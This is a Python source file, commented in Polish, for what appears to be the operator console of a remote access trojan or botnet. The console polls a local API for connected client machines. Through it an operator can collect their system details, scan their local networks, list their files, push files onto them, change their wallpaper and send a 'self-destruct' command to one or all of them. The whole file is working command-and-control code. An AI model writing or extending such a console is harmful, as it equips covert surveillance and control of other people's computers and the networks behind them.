import requests
import time
from termcolor import colored
import os
import threading
import queue
import json
import base64

# API host URL
API_URL = "http://localhost:5000"

# Kolejka do przekazywania komend pomiędzy wątkami
command_queue = queue.Queue()

# Czas w sekundach, po którym klient zostanie uznany za nieaktywnego
INACTIVITY_TIMEOUT = 25 

def get_clients():
    """Pobiera listę klientów od API."""
    try:
        response = requests.get(f"{API_URL}/clients", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(colored(f"\n[SERVER] Błąd: Nie można połączyć się z API host. Upewnij się, że APIhost.py jest uruchomiony. Szczegóły: {e}", "red"))
        return None

def check_for_inactive_clients():
    """Sprawdza i usuwa nieaktywnych klientów z API."""
    try:
        response = requests.get(f"{API_URL}/clients", timeout=5)
        response.raise_for_status()
        active_clients = response.json()
        
        clients_to_remove = []
        for ip, details in active_clients.items():
            if time.time() - details.get('last_seen', 0) > INACTIVITY_TIMEOUT:
                clients_to_remove.append(ip)

        for ip in clients_to_remove:
            requests.delete(f"{API_URL}/clients/{ip}")
            print(colored(f"[SERVER] Usunięto nieaktywnego klienta: {ip}", "yellow"))

    except requests.exceptions.RequestException as e:
        print(colored(f"\n[SERVER] Błąd: Nie można połączyć się z API host. Szczegóły: {e}", "red"))

def get_reports():
    """Pobiera nowe raporty od API i je wyświetla."""
    try:
        response = requests.get(f"{API_URL}/get_reports", timeout=5)
        response.raise_for_status()
        reports = response.json()

        for report in reports:
            ip = report['client_ip']
            status = report['status']
            info = report['info']
            report_time = time.strftime('%a %b %d %H:%M:%S %Y', time.localtime(report['time']))
            
            if status == "new_connection":
                print(colored(f"\n[SERVER] Klient [{ip}] połączony pomyślnie.", "green"))
            elif status == "Client is running.":
                pass
            elif status == "lan-scan-complete":
                lan_devices = info.get('lan_devices', [])
                if lan_devices:
                    print(colored(f"\n[REPORT] [{ip}] -> Wyniki skanowania sieci LAN:", "cyan"))
                    for device in lan_devices:
                        print(colored(f"  • {device}", "cyan"))
                else:
                    print(colored(f"\n[REPORT] [{ip}] -> Skanowanie LAN zakończone, nie znaleziono urządzeń.", "cyan"))
            elif status == "system-info-complete":
                print(colored(f"\n[REPORT] [{ip}] [INFO SYSTEMOWE] Zgromadzone dane:", "magenta"))
                print(colored(f"  • System operacyjny: {info.get('os', 'Brak informacji')}", "magenta"))
                print(colored(f"  • Katalog domowy: {info.get('home_directory', 'Brak informacji')}", "magenta"))
                programs = info.get('installed_programs', 'Brak informacji.')
                if isinstance(programs, list):
                    print(colored(f"  • Zainstalowane programy: {', '.join(programs[:5])}...", "magenta"))
                else:
                    print(colored(f"  • Zainstalowane programy: {programs}", "magenta"))
            elif status == "file-list-complete":
                print(colored(f"\n[REPORT] [{ip}] -> Lista plików dla ścieżki '{info.get('path')}':", "blue"))
                print(json.dumps(info.get('file_tree'), indent=2))
            elif status == "file-transfer-complete":
                print(colored(f"\n[REPORT] [{ip}] -> Plik '{info.get('file_name')}' został pomyślnie przesłany do '{info.get('path')}'.", "green"))
            elif status == "script-output":
                print(colored(f"\n[REPORT] [{ip}] -> Wynik wykonania skryptu:", "yellow"))
                print(info.get('output', ''))
            elif status == "wallpaper-change-complete":
                print(colored(f"\n[REPORT] [{ip}] -> Tapeta została zmieniona na '{info.get('path')}'.", "green"))
            elif status == "wallpaper-change-error":
                print(colored(f"\n[REPORT] [{ip}] -> Błąd zmiany tapety: {info.get('error')}", "red"))
            else:
                print(colored(f"\n[REPORT] [{ip}] -> {status}", "white"))
                if info:
                    print(colored(f"  Dane: {info}", "white"))
            
    except requests.exceptions.RequestException:
        pass

def send_command(client_ip, payload):
    """Wysyła komendę do konkretnego klienta."""
    try:
        response = requests.post(f"{API_URL}/send_command", json={"client_ip": client_ip, "command": payload}, timeout=5)
        response.raise_for_status()
        print(colored(f"[SERVER] Wysyłanie polecenia do klienta [{client_ip}]...", "green"))
    except requests.exceptions.RequestException as e:
        print(colored(f"Błąd: Nie można wysłać polecenia do klienta [{client_ip}]. Szczegóły: {e}", "red"))

def send_command_to_all(payload):
    """Wysyła komendę do wszystkich klientów."""
    try:
        response = requests.post(f"{API_URL}/send_command_to_all", json={"command": payload}, timeout=5)
        response.raise_for_status()
        print(colored("[SERVER] Wysyłanie polecenia do wszystkich klientów...", "green"))
    except requests.exceptions.RequestException as e:
        print(colored(f"Błąd: Nie można wysłać polecenia do wszystkich klientów. Szczegóły: {e}", "red"))

def clear_screen():
    """Czyści ekran konsoli."""
    os.system('cls' if os.name == 'nt' else 'clear')

def command_input_thread(q):
    """Wątek do obsługi wprowadzania komend przez użytkownika."""
    while True:
        command = input()
        q.put(command)

def display_help():
    """Wyświetla listę dostępnych komend."""
    print(colored("\n--- Lista Dostępnych Komend ---", "yellow"))
    print(colored("/help", "cyan") + " - Wyświetla listę komend.")
    print(colored("/list", "cyan") + " - Wyświetla listę podłączonych klientów.")
    print(colored("/clear", "cyan") + " - Czyści konsolę.")
    print(colored("/exit", "cyan") + " - Opuszcza konsolę serwera.")
    print(colored("/informacje [IP]", "cyan") + " - Zgłasza informacje systemowe klienta.")
    print(colored("/lan-print all", "cyan") + " - Skanuje sieć LAN wszystkich klientów.")
    print(colored("/lan-print [IP]", "cyan") + " - Skanuje sieć LAN wybranego klienta.")
    print(colored("/list-files [IP] [ścieżka]", "cyan") + " - Zwraca drzewo plików z podanej ścieżki.")
    print(colored("/transfer-file [IP] [ścieżka_pliku]", "cyan") + " - Wysyła plik do klienta.")
    print(colored("/zmien-tapete [IP/all] [ścieżka]", "cyan") + " - Zmienia tapetę na podany obraz.")
    print(colored("/auto-destrukcja [IP/all]", "cyan") + " - Wysyła polecenie samozniszczenia do klienta/klientów.")
    print(colored("----------------------------------", "yellow"))

def main():
    clear_screen()
    print(colored("Witamy w Konsoli Serwera. Wpisz '/help' aby uzyskać listę komend.", "green"))

    input_thread = threading.Thread(target=command_input_thread, args=(command_queue,), daemon=True)
    input_thread.start()

    last_inactive_check = time.time()

    while True:
        try:
            get_reports()
            
            if time.time() - last_inactive_check > 10:
                check_for_inactive_clients()
                last_inactive_check = time.time()
                
            command = command_queue.get(timeout=1)
            parts = command.split(" ", 2)
            main_command = parts[0]
            target = parts[1] if len(parts) > 1 else None
            extra_data = parts[2] if len(parts) > 2 else None

            if main_command == "/help":
                display_help()
            
            elif main_command == "/list":
                clients_list = get_clients()
                if clients_list:
                    print(colored("\n--- Podłączone Klienty ---", "yellow"))
                    for ip, details in clients_list.items():
                        last_seen_formatted = time.strftime('%a %b %d %H:%M:%S %Y', time.localtime(details['last_seen']))
                        print(colored(f"• IP: {ip} [Wersja: {details['version']}]", "green"))
                        print(colored(f"  Status: {details['status']}", "white"))
                        print(colored(f"  Ostatnio widziany: {last_seen_formatted}", "white"))
                    print(colored("--------------------------", "yellow"))

            elif main_command == "/informacje":
                if target and target != "all":
                    payload = {"type": "get-info", "data": {}}
                    send_command(target, payload)

            elif main_command == "/lan-print":
                if target == "all":
                    payload = {"type": "lan-print-all", "data": {}}
                    send_command_to_all(payload)
                elif target:
                    payload = {"type": "lan-print", "data": {}}
                    send_command(target, payload)

            elif main_command == "/zmien-tapete":
                if not target or not extra_data:
                    print(colored("Błąd: Użycie: /zmien-tapete [IP/all] [ścieżka na komputerze klienta do tapety]", "red"))
                    continue
                
                payload = {"type": "change-wallpaper", "data": {"path": extra_data}}
                if target.lower() == "all":
                    send_command_to_all(payload)
                else:
                    send_command(target, payload)
            
            elif main_command == "/auto-destrukcja":
                if target == "all":
                    confirm = input(colored("Jesteś pewien, że chcesz zniszczyć WSZYSTKICH klientów? To działanie jest nieodwracalne. Wpisz 'YES' aby potwierdzić: ", "red"))
                    if confirm.upper() == "YES":
                        payload = {"type": "self-destruct", "data": {}}
                        send_command_to_all(payload)
                elif target:
                    confirm = input(colored(f"Jesteś pewien, że chcesz zniszczyć klienta [{target}]? To działanie jest nieodwracalne. Wpisz 'YES' aby potwierdzić: ", "red"))
                    if confirm.upper() == "YES":
                        payload = {"type": "self-destruct", "data": {}}
                        send_command(target, payload)
            
            elif main_command == "/list-files":
                if not target or not extra_data:
                    print(colored("Błąd: Użycie: /list-files [IP] [ścieżka]", "red"))
                    continue
                
                payload = {"type": "list-files", "data": {"path": extra_data}}
                send_command(target, payload)
            
            elif main_command == "/transfer-file":
                if not target or not extra_data:
                    print(colored("Błąd: Użycie: /transfer-file [IP] [ścieżka_pliku]", "red"))
                    continue
                
                target_ip = target
                file_path = extra_data
                try:
                    with open(file_path, "rb") as f:
                        file_content = base64.b64encode(f.read()).decode('utf-8')
                    
                    file_name = os.path.basename(file_path)
                    
                    payload = {
                        "type": "file-transfer",
                        "data": {
                            "file_name": file_name,
                            "file_content": file_content,
                            "target_path": "automatic"  # Uproszczona ścieżka
                        }
                    }
                    send_command(target_ip, payload)
                except FileNotFoundError:
                    print(colored(f"Błąd: Plik '{file_path}' nie został znaleziony.", "red"))
                except Exception as e:
                    print(colored(f"Błąd podczas przygotowywania pliku do wysłania: {e}", "red"))

            elif main_command == "/clear":
                clear_screen()
                    
            elif main_command == "/exit":
                print(colored("Opuszczanie konsoli serwera.", "yellow"))
                break
                
            else:
                print(colored(f"Nieznana komenda: {command}. Wpisz '/help' aby uzyskać listę komend.", "red"))

        except queue.Empty:
            pass # Puste, ponieważ wątek wejściowy nie przekazał żadnej komendy

        except KeyboardInterrupt:
            print(colored("\nPrzerwanie przez użytkownika. Opuszczanie...", "yellow"))
            break
        except Exception as e:
            # Ogólna obsługa pozostałych błędów
            print(colored(f"Wystąpił nieoczekiwany błąd: {e}", "red"))
        
        time.sleep(1)

if __name__ == "__main__":
    main()